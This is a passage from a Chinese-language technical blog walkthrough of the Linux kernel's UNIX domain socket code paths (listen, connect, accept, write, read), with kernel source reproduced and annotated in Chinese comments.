sk-\u0026gt;sk_max_ack_backlog = backlog; // 设置新的等待队列大小 sk-\u0026gt;sk_state = TCP_LISTEN; // 将套接字状态设置为监听 // 设置连接的凭证，以便连接操作可以复制它们 init_peercred(sk); err = 0; out_unlock: unix_state_unlock(sk); // 解锁套接字状态 out: return err; // 返回错误码 } connect() 一句话概括connect函数：实现了 UNIX domain socket 的连接逻辑。它处理了客户端套接字连接到服务器监听套接字的过程。\n1 2 3 4 5 6 //syscall SYSCALL_DEFINE3(connect, int, fd, struct sockaddr __user *, uwservaddr, int, addrlen) { return __sys_connect(fd, uservaddr, addrlen); } connect()-\u0026gt;__sys_connect()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 int __sys_connect(int fd, struct sockaddr __user *uservaddr, int addrlen) { int ret = -EBADF; struct fd f; // 获取文件描述符的X文件对象 (fdget())： f = fdget(fd); if (f.file) { struct sockaddr_storage address; // move_addr_to_kernel()：将用户空间的地址（uservaddr）移动到内核空间的 address 结构中。这一步将用户提供的地址拷贝到内核中，以便内核能够安全地使用它。 ret = move_addr_to_kernel(uservaddr, addrlen, \u0026amp;address); if (!ret) // __sys_connect_file()：这是一个实际进行连接操作的函数。它接收文件对象（即套接字）、内核中的地址结构以及地址长度，完成连接操作。 ret = __sys_connect_file(f.file, \u0026amp;address, addrlen, 0); fdput(f); } return ret; } __sys_connect()-\u0026gt;__sys_connect_file()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 int __sys_connect_file(struct file *file, struct sockaddr_storage *address, int addrlen, int file_flags) { struct socket *sock; int err; // 获取套接字对象 sock = sock_from_file(file); if (!sock) { err = -ENOTSOCK; goto out; } // security_socket_connect()：调用 Linux 安全模块（LSM）进行安全检查，确保当前用户或进程有权限对指定的套接字发起连接请求。 err = security_socket_connect(sock, (struct sockaddr *)address, addrlen); if (err) goto out; // READ_ONCE(sock-\u0026gt;ops)：读取套接字操作表。由于套接字的操作表可能会被多线程并发修改，使用 READ_ONCE() 确保读取的值是最新的。 // sock-\u0026gt;ops-\u0026gt;connect()：调用套接字的 connect 操作函数，执行实际的连接操作。 err = READ_ONCE(sock-\u0026gt;ops)-\u0026gt;connect(sock, (struct sockaddr *)address, addrlen, sock-\u0026gt;file-\u0026gt;f_flags | file_flags); out: return err; } **注意：**这里(sock-\u0026gt;ops)-\u0026gt;connect()会根据套接字的类型调用不同的实现函数，例如SOCK_STREAM会调用unix_stream_connect()，SOCK_DGRAM：会调用unix_dgram_connect()。\n在 UNIX domain socket 中，套接字的类型取决于在调用 socket() 函数时所指定的类型参数。主要有以下几种类型：\nSOCK_STREAM (流式套接字)： 在你提供的代码中，使用了 SOCK_STREAM，这意味着套接字是流式的，类似于 TCP 协议的套接字。 特性：面向连接，提供可靠的、按顺序的、无数据丢失的通信，适用于需要可靠传输的场景。 我的 server.c 和 client.c 文件中都使用了 AF_UNIX 和 SOCK_STREAM，因此这两个套接字是可靠的面向连接的流式套接字。 SOCK_DGRAM (数据报套接字)： 这是另一种类型的 UNIX domain socket，类似于 UDP 协议的套接字。 特性：面向无连接，传输不保证顺序或可靠性，适用于对可靠性要求较低但速度较快的场景。 使用 SOCK_DGRAM 可以在 UNIX domain 中实现无连接的数据报通信。 SOCK_SEQPACKET (有序分组套接字)： 这是 UNIX domain socket 中的一种较少使用的类型。 特性：面向连接，提供可靠的、有序的数据传输，但不像 SOCK_STREAM 那样是一个连续的数据流，而是一个有序的数据包序列。 适用于需要有序传输数据包的应用。 unix_stream_connect() 函数实现了 UNIX domain socket 的连接逻辑。它处理了客户端套接字连接到服务器监听套接字的过程。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 static int unix_stream_connect(struct socket *sock, struct sockaddr *uaddr, int addr_len, int flags) { // 将传入的通用地址结构转换为 UNIX 专用地址结构 struct sockaddr_un *sunaddr = (struct sockaddr_un *)uaddr; struct sock *sk = sock-\u0026gt;sk, *newsk = NULL, *other = NULL; struct unix_sock *u = unix_sk(sk), *newu, *otheru; struct net *net = sock_net(sk); struct sk_buff *skb = NULL; long timeo;X@ int err; int st; // 验证传入的地址是否有效 err = unix_validate_addr(sunaddr, addr_len); if (err) goto out; // 如果套接字需要传递凭据但尚未绑定，则进行自动绑定 if ((test_bit(SOCK_PASSCRED, \u0026amp;sock-\u0026gt;flags) || test_bit(SOCK_PASSPIDFD, \u0026amp;sock-\u0026gt;flags)) \u0026amp;\u0026amp; !u-\u0026gt;addr) { err = unix_autobind(sk); if (err) goto out; } // 设置超时时间，取决于是否为非阻塞模式 timeo = sock_sndtimeo(sk, flags \u0026amp; O_NONBLOCK); // 创建一个新的套接字，用于代表即将建立的连接 newsk = unix_create1(net, NULL, 0, sock-\u0026gt;type); if (IS_ERR(newsk)) { err = PTR_ERR(newsk); newsk = NULL; goto out; } err = -ENOMEM; // 为新的套接字分配sk_buff skb = sock_wmalloc(newsk, 1, 0, GFP_KERNEL); if (skb == NULL) goto out; restart: // 查找监听套接字 other = unix_find_other(net, sunaddr, addr_len, sk-\u0026gt;sk_type); if (IS_ERR(other)) { err = PTR_ERR(other); other = NULL; goto out; } // 锁定目标套接字的状态 unix_state_lock(other); // 如果目标套接字已死亡，解锁并重新查找 if (sock_flag(other, SOCK_DEAD)) { unix_state_unlock(other); sock_put(other); goto restart; } // 检查目标套接字是否在监听状态，或已关闭接收 err = -ECONNREFUSED; if (other-\u0026gt;sk_state != TCP_LISTEN) goto out_unlock; if (other-\u0026gt;sk_shutdown \u0026amp; RCV_SHUTDOWN) goto out_unlock; // 如果目标监听套接字的接收队列已满，则等待直到有空间或超时 if (unix_recvq_full(other)) { err = -EAGAIN; if (!timeo) goto out_unlock; timeo = unix_wait_for_peer(other, timeo); err = sock_intr_errno(timeo); if (signal_pending(current)) goto out; sock_put(other); goto restart; } // 锁定发起连接的套接字状态 st = sk-\u0026gt;sk_state; switch (st) { case TCP_CLOSE: // 套接字处于关闭状态，可以继续连接 break; case TCP_ESTABLISHED: // 套接字已经连接 err = -EISCONN; goto out_unlock; default: err = -EINVAL; goto out_unlock; } unix_state_lock_nested(sk); // 在锁定状态下重新检查套接字状态，确保没有变化 if (sk-\u0026gt;sk_state != st) { unix_state_unlock(sk); unix_state_unlock(other); sock_put(other); goto restart; } // 进行安全性检查 err = security_unix_stream_connect(sk, other, newsk); if (err) { unix_state_unlock(sk); goto out_unlock; } // 设置新套接字以完成连接 sock_hold(sk); unix_peer(newsk) = sk; newsk-\u0026gt;sk_state = TCP_ESTABLISHED; newsk-\u0026gt;sk_type = sk-\u0026gt;sk_type; init_peercred(newsk); newu = unix_sk(newsk); RCU_INIT_POINTER(newsk-\u0026gt;sk_wq, \u0026amp;newu-\u0026gt;peer_wq); otheru = unix_sk(other); // 从监听套接字复制地址信息到新套接字 if (otheru-\u0026gt;path.dentry) { path_get(\u0026amp;otheru-\u0026gt;path); newu-\u0026gt;path = otheru-\u0026gt;path; } refcount_inc(\u0026amp;otheru-\u0026gt;addr-\u0026gt;refcnt); smp_store_release(\u0026amp;newu-\u0026gt;addr, otheru-\u0026gt;addr); // 设置新套接字的凭据 copy_peercred(sk, other); // 更新客户端套接字和新套接字的状态为已连接 sock-\u0026gt;state = SS_CONNECTED; sk-\u0026gt;sk_state = TCP_ESTABLISHED; sock_hold(newsk); smp_mb__after_atomic(); unix_peer(sk) = newsk; unix_state_unlock(sk); // 将连接信息发送给监听套接字 spin_lock(\u0026amp;other-\u0026gt;sk_receive_queue.lock); __skb_queue_tail(\u0026amp;other-\u0026gt;sk_receive_queue, skb); spin_unlock(\u0026amp;other-\u0026gt;sk_receive_queue.lock); unix_state_unlock(other); other-\u0026gt;sk_data_ready(other); sock_put(other); return 0; out_unlock: if (other) unix_state_unlock(other); out: kfree_skb(skb); if (newsk) unix_release_sock(newsk, 0); if (other) sock_put(other); return err; } unix_find_other()：查找对方正在监听的套接字\n1 2 3 4 5 6 7 8 9 10 11 12 13 static struct sock *unix_find_other(struct net *net, struct sockaddr_un *sunaddr, int addr_len, int type) { struct sock *sk; if (sunaddr-\u0026gt;sun_path[0]) sk = unix_find_bsd(sunaddr, addr_len, type); else sk = unix_find_abstract(net, sunaddr, addr_len, type); return sk; } 这里有两个查找函数，我们选择bsd风格分析。\nunix_find_bsd() 函数用于在文件系统中查找与 BSD 风格地址绑定的 UNIX domain socket。它通过给定的路径名找到对应的文件（套接字），并返回与之关联的 sock 结构体。以下是对该函数的逐步分析和中文注释。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 static struct sock *unix_find_bsd(struct sockaddr_un *sunaddr, int addr_len, int type) { struct inode *inode; struct path path; struct sock *sk; int err; // 构建 BSD 风格地址，确保 sun_path 合法 unix_mkname_bsd(sunaddr, addr_len); // 使用 kern_path 查找给定路径对应的文件对象 err = kern_path(sunaddr-\u0026gt;sun_path, LOOKUP_FOLLOW, \u0026amp;path); if (err) goto fail; // 检查对路径的写权限，以确保能够绑定 err = path_permission(\u0026amp;path, MAY_WRITE); if (err) goto path_put; // 检查该路径对应的 inode 是否为套接字类型 err = -ECONNREFUSED; inode = d_backing_inode(path.dentry); if (!S_ISSOCK(inode-\u0026gt;i_mode)) goto path_put; // 查找 inode 对应的套接字对象 sk = unix_find_socket_byinode(inode); if (!sk) goto path_put; // 确保套接字类型一致 err = -EPROTOTYPE; if (sk-\u0026gt;sk_type == type) touch_atime(\u0026amp;path); // 更新访问时间 else goto sock_put; // 释放路径资源 path_put(\u0026amp;path); return sk; sock_put: // 释放套接字引用 sock_put(sk); path_put: // 释放路径引用 path_put(\u0026amp;path); fail: // 返回错误指针 return ERR_PTR(err); } accept() 从监听套接字中接受一个新连接，并将新连接的套接字信息复制到传入的一个新的套接字\n1 2 3 4 5 6 // syscall SYSCALL_DEFINE3(accept, int, fd, struct sockaddr __user *, upeer_sockaddr, int __user *, upeer_addrlen) { return __sys_accept4(fd, upeer_sockaddr, upeer_addrlen, 0); } accept()-\u0026gt;__sys_accept4()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 int __sys_accept4(int fd, struct sockaddr __user *upeer_sockaddr, int __user *upeer_addrlen, int flags) { int ret = -EBADF; struct fd f; f = fdget(fd); if (f.file) { ret = __sys_accept4_file(f.file, upeer_sockaddr, upeer_addrlen, flags); fdput(f); } return ret; } __sys_accept4()-\u0026gt;__sys_accept4_file()\n__sys_accept4_file() 函数实现了对已存在套接字文件的 accept 操作，该函数用于从文件描述符中获取新连接。它允许对新的套接字设置一些标志，比如非阻塞和关闭文件描述符时自动执行 close。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 static int __sys_accept4_file(struct file *file, struct sockaddr __user *upeer_sockaddr, int __user *upeer_addrlen, int flags) { struct file *newfile; int newfd; // 检查 flags，确保它们是合法的，不能有除 SOCK_CLOEXEC 和 SOCK_NONBLOCK 之外的其他标志 if (flags \u0026amp; ~(SOCK_CLOEXEC | SOCK_NONBLOCK)) return -EINVAL; // 如果 SOCK_NONBLOCK 与 O_NONBLOCK 不相等且设置了 SOCK_NONBLOCK，则转换为 O_NONBLOCK if (SOCK_NONBLOCK != O_NONBLOCK \u0026amp;\u0026amp; (flags \u0026amp; SOCK_NONBLOCK)) flags = (flags \u0026amp; ~SOCK_NONBLOCK) | O_NONBLOCK; // 获取一个新的文件描述符 newfd = get_unused_fd_flags(flags); if (unlikely(newfd \u0026lt; 0)) return newfd; // 使用 do_accept 函数接受连接，返回新的文件对象 newfile = do_accept(file, 0, upeer_sockaddr, upeer_addrlen, flags); if (IS_ERR(newfile)) { // 如果出错，则释放之前获取的文件描述符 put_unused_fd(newfd); return PTR_ERR(newfile); } // 将新的文件对象安装到新获取的文件描述符上 fd_install(newfd, newfile); return newfd; } __sys_accept4_file()-\u0026gt;do_accept()\ndo_accept() 函数用于接受传入的连接请求，为新的连接创建套接字，并返回一个与新连接关联的文件对象。该函数是处理 accept 系统调用的核心部分，主要负责资源的分配和连接的建立。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 struct file *do_accept(struct file *file, unsigned file_flags, struct sockaddr __user *upeer_sockaddr, int __user *upeer_addrlen, int flags) { struct socket *sock, *newsock; struct file *newfile; int err, len; struct sockaddr_storage address; const struct proto_ops *ops; // 从文件对象获取套接字 sock = sock_from_file(file); if (!sock) return ERR_PTR(-ENOTSOCK); // 为新的连接分配套接字 newsock = sock_alloc(); if (!newsock) return ERR_PTR(-ENFILE); // 获取原始套接字的操作指针 ops = READ_ONCE(sock-\u0026gt;ops); // 设置新套接字的类型和操作指针 newsock-\u0026gt;type = sock-\u0026gt;type; newsock-\u0026gt;ops = ops; /* * 我们不需要调用 try_module_get，因为监听套接字 (sock) 已经持有了 * 协议模块 (sock-\u0026gt;ops-\u0026gt;owner)。 */ __module_get(ops-\u0026gt;owner); // 为新套接字分配文件对象，并使用给定的标志 newfile = sock_alloc_file(newsock, flags, sock-\u0026gt;sk-\u0026gt;sk_prot_creator-\u0026gt;name); if (IS_ERR(newfile)) return newfile; // 进行安全检查，确保可以接受连接 err = security_socket_accept(sock, newsock); if (err) goto out_fd; // 调用套接字的 accept 操作以建立新连接 err = ops-\u0026gt;accept(sock, newsock, sock-\u0026gt;file-\u0026gt;f_flags | file_flags, false); if (err \u0026lt; 0) goto out_fd; // 如果需要，获取对等端的地址信息 if (upeer_sockaddr) { len = ops-\u0026gt;getname(newsock, (struct sockaddr *)\u0026amp;address, 2); if (len \u0026lt; 0) { err = -ECONNABORTED; goto out_fd; } err = move_addr_to_user(\u0026amp;address, len, upeer_sockaddr, upeer_addrlen); if (err \u0026lt; 0) goto out_fd; } /* 文件标志不会通过 accept() 继承，这与其他操作系统不同。 */ return newfile; out_fd: // 释放新文件对象的引用，释放资源 fput(newfile); return ERR_PTR(err); } do_accept()-\u0026gt;unix_accept()\nunix_accept() 函数用于实现 UNIX domain socket 的 accept 操作，它从监听套接字中接受一个新连接，并将新连接的套接字信息复制到传入的 newsock 中。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 static int unix_accept(struct socket *sock, struct socket *newsock, int flags, bool kern) { struct sock *sk = sock-\u0026gt;sk; struct sock *tsk; struct sk_buff *skb; int err; // 如果套接字类型不是 SOCK_STREAM 或 SOCK_SEQPACKET，则返回不支持的错误 err = -EOPNOTSUPP; if (sock-\u0026gt;type != SOCK_STREAM \u0026amp;\u0026amp; sock-\u0026gt;type != SOCK_SEQPACKET) goto out; // 如果套接字状态不是 TCP_LISTEN，则返回无效参数错误 err = -EINVAL; if (sk-\u0026gt;sk_state != TCP_LISTEN) goto out; /* 如果套接字状态为 TCP_LISTEN，它在此处不会改变（暂时...），因此不需要加锁。 */ // 尝试从监听套接字的接收队列中获取数据包 skb = skb_recv_datagram(sk, (flags \u0026amp; O_NONBLOCK) ? MSG_DONTWAIT : 0, \u0026amp;err); if (!skb) { // 如果接收队列为空并且发生接收关闭，返回错误 if (err == 0) err = -EINVAL; goto out; } // 获取新连接的套接字 tsk = skb-\u0026gt;sk; skb_free_datagram(sk, skb); // 唤醒等待连接的进程 wake_up_interruptible(\u0026amp;unix_sk(sk)-\u0026gt;peer_wait); // 将新连接的套接字附加到传入的 newsock 上 unix_state_lock(tsk); newsock-\u0026gt;state = SS_CONNECTED; unix_sock_inherit_flags(sock, newsock); sock_graft(tsk, newsock); unix_state_unlock(tsk); return 0; out: return err; } write() 1 2 3 4 5 SYSCALL_DEFINE3(write, unsigned int, fd, const char __user *, buf, size_t, count) { return ksys_write(fd, buf, count); } write()-\u0026gt;ksys_write()\nksys_write() 是 Linux 内核中实现的一个系统调用处理函数，用于处理来自用户态的 write() 系统调用。在这个函数中，它接收了一个文件描述符 fd、一个用户空间的缓冲区 buf 以及写入的字节数 count，并通过相应的文件系统接口将数据写入目标文件或设备。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 ssize_t ksys_write(unsigned int fd, const char __user *buf, size_t count) { struct fd f = fdget_pos(fd); ssize_t ret = -EBADF; // 确保文件描述符有效 if (f.file) { // file_ppos(f.file)：该函数用于获取文件的当前偏移量指针。对于某些文件类型（如常规文件），偏移量需要不断更新，而对于某些特殊文件（如 socket），可能不需要偏移量。 loff_t pos, *ppos = file_ppos(f.file); // 如果文件指针存在，设置写入的起始位置 if (ppos) { pos = *ppos; ppos = \u0026amp;pos; } // 调用 vfs_write 进行实际的写入操作，具体的写入操作将由不同的文件系统或设备驱动来实现，例如字符设备、块设备、网络套接字等。 ret = vfs_write(f.file, buf, count, ppos); // 更新文件的偏移量 if (ret \u0026gt;= 0 \u0026amp;\u0026amp; ppos) f.file-\u0026gt;f_pos = pos; // 释放文件描述符引用 fdput_pos(f); } return ret; } ksys_write()-\u0026gt;vfs_write()\nvfs_write() 是 Linux 内核中用于处理文件写入操作的虚拟文件系统（VFS）接口函数。它接收一个 struct file 指针、用户空间缓冲区、要写入的字节数以及文件的偏移量指针，负责执行实际的数据写入操作。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 ssize_t vfs_write(struct file *file, const char __user *buf, size_t count, loff_t *pos) { ssize_t ret; // 检查文件是否具有写权限 if (!(file-\u0026gt;f_mode \u0026amp; FMODE_WRITE)) return -EBADF; // 检查文件是否可以写 if (!(file-\u0026gt;f_mode \u0026amp; FMODE_CAN_WRITE)) return -EINVAL; // 检查用户空间缓冲区是否可访问 if (unlikely(!access_ok(buf, count))) return -EFAULT; // 验证写入区域是否合法 ret = rw_verify_area(WRITE, file, pos, count); if (ret) return ret; // 限制写入字节数，避免过大的写入 if (count \u0026gt; MAX_RW_COUNT) count = MAX_RW_COUNT; // file_start_write()：用于文件系统的并发控制，开始写操作。某些文件系统需要这种机制来确保数据一致性。 file_start_write(file); // 调用具体的写入函数 if (file-\u0026gt;f_op-\u0026gt;write) ret = file-\u0026gt;f_op-\u0026gt;write(file, buf, count, pos); // 旧版写入接口 else if (file-\u0026gt;f_op-\u0026gt;write_iter) ret = new_sync_write(file, buf, count, pos); // 新版写入接口 else ret = -EINVAL; // 如果写入成功，进行通知和更新统计 if (ret \u0026gt; 0) { fsnotify_modify(file); add_wchar(current, ret); } // 更新写入系统调用计数 inc_syscw(current); // 结束写操作 file_end_write(file); return ret; } vfs_write()-\u0026gt;sock_write_iter()\nsock_write_iter() 是用于实现套接字文件写入的函数，支持通过迭代接口 (write_iter)来完成写入操作。该函数从用户空间获取数据并写入到与之关联的套接字中。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 static ssize_t sock_write_iter(struct kiocb *iocb, struct iov_iter *from) { struct file *file = iocb-\u0026gt;ki_filp; struct socket *sock = file-\u0026gt;private_data; struct msghdr msg = {.msg_iter = *from, .msg_iocb = iocb}; ssize_t res; // 如果文件偏移量不为0，则返回-ESPIPE错误，因为套接字是流式文件，不支持位置调整 if (iocb-\u0026gt;ki_pos != 0) return -ESPIPE; // 如果文件是非阻塞模式或者IOCB标志设置了不等待，则设置消息标志MSG_DONTWAIT if (file-\u0026gt;f_flags \u0026amp; O_NONBLOCK || (iocb-\u0026gt;ki_flags \u0026amp; IOCB_NOWAIT)) msg.msg_flags = MSG_DONTWAIT; // 如果套接字类型是顺序包（SOCK_SEQPACKET），设置消息标志MSG_EOR if (sock-\u0026gt;type == SOCK_SEQPACKET) msg.msg_flags |= MSG_EOR; // 调用内核函数发送消息 res = __sock_sendmsg(sock, \u0026amp;msg); // 更新迭代器状态 *from = msg.msg_iter; return res; } __sock_sendmsg()-\u0026gt;__sock_sendmsg()\n1 2 3 4 5 6 7 static int __sock_sendmsg(struct socket *sock, struct msghdr *msg) { int err = security_socket_sendmsg(sock, msg, msg_data_left(msg)); return err ?: sock_sendmsg_nosec(sock, msg); } __sock_sendmsg()-\u0026gt;sock_sendmsg_nosec()\nsock_sendmsg_nosec() 是一个内核中的静态内联函数，主要用于发送消息（sendmsg）的操作。这个函数的作用是将用户空间的消息封装后，通过调用套接字协议的发送函数，将数据发送到相应的网络栈中。\n1 2 3 4 5 6 7 8 9 10 11 12 static inline int sock_sendmsg_nosec(struct socket *sock, struct msghdr *msg) { // READ_ONCE(sock-\u0026gt;ops)-\u0026gt;sendmsg：使用 READ_ONCE 读取套接字的操作结构体（sock-\u0026gt;ops）中的 sendmsg 函数指针，确保读取的原子性。sendmsg 是不同协议的实现函数，这里通过动态判断协议类型并调用合适的 sendmsg 函数，先调用sock-\u0026gt;ops-\u0026gt;sendmsg，若为空，则会调用IPv4 或 IPv6 。 int ret = INDIRECT_CALL_INET(READ_ONCE(sock-\u0026gt;ops)-\u0026gt;sendmsg, inet6_sendmsg, inet_sendmsg, sock, msg, msg_data_left(msg)); BUG_ON(ret == -EIOCBQUEUED); if (trace_sock_send_length_enabled()) call_trace_sock_send_length(sock-\u0026gt;sk, ret, 0); return ret; } sock_sendmsg_nosec()-\u0026gt;unix_stream_sendmsg()\nunix_stream_sendmsg() 是用于 Unix 域套接字的数据发送函数，支持流式 (SOCK_STREAM) 套接字。它负责将用户空间的数据通过套接字发送给已连接的另一端。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 static int unix_stream_sendmsg(struct socket *sock, struct msghdr *msg, size_t len) { struct sock *sk = sock-\u0026gt;sk; struct sock *other = NULL; int err, size; struct sk_buff *skb; int sent = 0; struct scm_cookie scm; bool fds_sent = false; int data_len; // 等待 Unix 垃圾回收完成 wait_for_unix_gc(); // 处理控制信息 err = scm_send(sock, msg, \u0026amp;scm, false); if (err \u0026lt; 0) return err; // 不支持 MSG_OOB（带外数据） err = -EOPNOTSUPP; if (msg-\u0026gt;msg_flags \u0026amp; MSG_OOB) { #if IS_ENABLED(CONFIG_AF_UNIX_OOB) if (len) len--; else #endif goto out_err; } // 验证是否有目标连接 if (msg-\u0026gt;msg_namelen) { err = sk-\u0026gt;sk_state == TCP_ESTABLISHED ? -EISCONN : -EOPNOTSUPP; goto out_err; } else { err = -ENOTCONN; other = unix_peer(sk); if (!other) goto out_err; } // 检查发送端是否已经关闭 if (sk-\u0026gt;sk_shutdown \u0026amp; SEND_SHUTDOWN) goto pipe_err; // 循环发送数据 while (sent \u0026lt; len) { size = len - sent; if (unlikely(msg-\u0026gt;msg_flags \u0026amp; MSG_SPLICE_PAGES)) { // 使用 splice 方法分配发送缓冲区 skb = sock_alloc_send_pskb(sk, 0, 0, msg-\u0026gt;msg_flags \u0026amp; MSG_DONTWAIT, \u0026amp;err, 0); } else { // 以发送缓冲区的一半大小为最大值，避免阻塞 size = min_t(int, size, (sk-\u0026gt;sk_sndbuf \u0026gt;\u0026gt; 1) - 64); // 限制 size 以保证可以进行 order-0 分配 size = min_t(int, size, SKB_MAX_HEAD(0) + UNIX_SKB_FRAGS_SZ); data_len = max_t(int, 0, size - SKB_MAX_HEAD(0)); data_len = min_t(size_t, size, PAGE_ALIGN(data_len)); // 分配发送缓冲区 skb = sock_alloc_send_pskb(sk, size - data_len, data_len, msg-\u0026gt;msg_flags \u0026amp; MSG_DONTWAIT, \u0026amp;err, get_order(UNIX_SKB_FRAGS_SZ)); } if (!skb) goto out_err; // 将文件描述符仅在第一个缓冲区中发送 err = unix_scm_to_skb(\u0026amp;scm, skb, !fds_sent); if (err \u0026lt; 0) { kfree_skb(skb); goto out_err; } fds_sent = true; // 使用 splice 进行数据拷贝 if (unlikely(msg-\u0026gt;msg_flags \u0026amp; MSG_SPLICE_PAGES)) { err = skb_splice_from_iter(skb, \u0026amp;msg-\u0026gt;msg_iter, size, sk-\u0026gt;sk_allocation); if (err \u0026lt; 0) { kfree_skb(skb); goto out_err; } size = err; refcount_add(size, \u0026amp;sk-\u0026gt;sk_wmem_alloc); } else { skb_put(skb, size - data_len); skb-\u0026gt;data_len = data_len; skb-\u0026gt;len = size; // 将数据从迭代器拷贝到发送缓冲区 err = skb_copy_datagram_from_iter(skb, 0, \u0026amp;msg-\u0026gt;msg_iter, size); if (err) { kfree_skb(skb); goto out_err; } } // 锁住对端套接字 unix_state_lock(other); // 如果对端套接字已关闭，跳转到错误处理 if (sock_flag(other, SOCK_DEAD) || (other-\u0026gt;sk_shutdown \u0026amp; RCV_SHUTDOWN)) goto pipe_err_free; // 添加凭据 maybe_add_creds(skb, sock, other); scm_stat_add(other, skb); // 将数据包加入到对端的接收队列 skb_queue_tail(\u0026amp;other-\u0026gt;sk_receive_queue, skb); unix_state_unlock(other); // 通知对端有新数据 other-\u0026gt;sk_data_ready(other); sent += size; } #if IS_ENABLED(CONFIG_AF_UNIX_OOB) // 处理带外数据 if (msg-\u0026gt;msg_flags \u0026amp; MSG_OOB) { err = queue_oob(sock, msg, other, \u0026amp;scm, fds_sent); if (err) goto out_err; sent++; } #endif // 销毁控制信息 scm_destroy(\u0026amp;scm); return sent; pipe_err_free: unix_state_unlock(other); kfree_skb(skb); pipe_err: // 如果发送失败，且非 MSG_NOSIGNAL，则发送 SIGPIPE 信号 if (sent == 0 \u0026amp;\u0026amp; !(msg-\u0026gt;msg_flags \u0026amp; MSG_NOSIGNAL)) send_sig(SIGPIPE, current, 0); err = -EPIPE; out_err: scm_destroy(\u0026amp;scm); return sent ? : err; } unix_stream_sendmsg函数中将将数据从迭代器拷贝到skb中有两种不同的方法：使用splice方法(skb_splice_from_iter)和普通方法(skb_copy_datagram_from_iter)\n注：splice方法会在启用MSG_SPLICE_PAGES选项时使用。\n这里我们介绍普通方法 skb_copy_datagram_from_iter()\nskb_copy_datagram_from_iter() 是 Linux 内核中用于将数据从 iov_iter 迭代器复制到套接字缓冲区 (sk_buff) 中的函数。它用于处理数据的拷贝过程，将用户空间或内核中的数据传递到 sk_buff，以便进行进一步的网络传输或处理。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 int skb_copy_datagram_from_iter(struct sk_buff *skb, int offset, struct iov_iter *from, int len) { int start = skb_headlen(skb); int i, copy = start - offset; struct sk_buff *frag_iter; /* Copy header. */ // 首先将头部数据复制到缓冲区中 if (copy \u0026gt; 0) { if (copy \u0026gt; len) copy = len; if (copy_from_iter(skb-\u0026gt;data + offset, copy, from) != copy) goto fault; if ((len -= copy) == 0) return 0; offset += copy; } /* Copy paged appendix. Hmm... why does this look so complicated? */ // 处理页片段的数据拷贝 for (i = 0; i \u0026lt; skb_shinfo(skb)-\u0026gt;nr_frags; i++) { int end; const skb_frag_t *frag = \u0026amp;skb_shinfo(skb)-\u0026gt;frags[i]; WARN_ON(start \u0026gt; offset + len); end = start + skb_frag_size(frag); if ((copy = end - offset) \u0026gt; 0) { size_t copied; if (copy \u0026gt; len) copy = len; copied = copy_page_from_iter(skb_frag_page(frag), skb_frag_off(frag) + offset - start, copy, from); if (copied != copy) goto fault; if (!(len -= copy)) return 0; offset += copy; } start = end; } /* Copy data from skb fragments (e.g., GSO fragments) */ skb_walk_frags(skb, frag_iter) { int end; WARN_ON(start \u0026gt; offset + len); end = start + frag_iter-\u0026gt;len; if ((copy = end - offset) \u0026gt; 0) { if (copy \u0026gt; len) copy = len; if (skb_copy_datagram_from_iter(frag_iter, offset - start, from, copy)) goto fault; if ((len -= copy) == 0) return 0; offset += copy; } start = end; } if (!len) return 0; fault: return -EFAULT; } read() 1 2 3 4 5 // syscall SYSCALL_DEFINE3(read, unsigned int, fd, char __user *, buf, size_t, count) { return ksys_read(fd, buf, count); } read()-\u0026gt;ksys_read()\nksys_read 函数是 Linux 内核中用于读取文件描述符内容的函数。它的目的是从指定的文件描述符 (fd) 中读取数据到用户提供的缓冲区 (buf) 中，并返回读取的字节数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ssize_t ksys_read(unsigned int fd, char __user *buf, size_t 